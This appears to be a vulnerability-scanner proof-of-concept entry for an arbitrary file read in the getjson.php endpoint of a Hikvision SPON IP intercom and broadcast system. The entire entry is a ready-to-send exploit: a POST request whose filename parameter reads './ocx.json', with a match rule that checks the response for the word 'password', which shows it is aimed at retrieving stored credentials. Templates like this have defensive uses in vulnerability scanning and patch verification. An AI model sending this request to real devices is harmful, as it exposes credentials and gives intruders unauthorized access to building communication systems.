{
        'name': '海康威视SPON IP网络对讲广播系统getjson存在任意文件读取',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/php/getjson.php',
            'headers': {
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': 'jsondata[filename]=./ocx.json',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'password'
        }}]
    }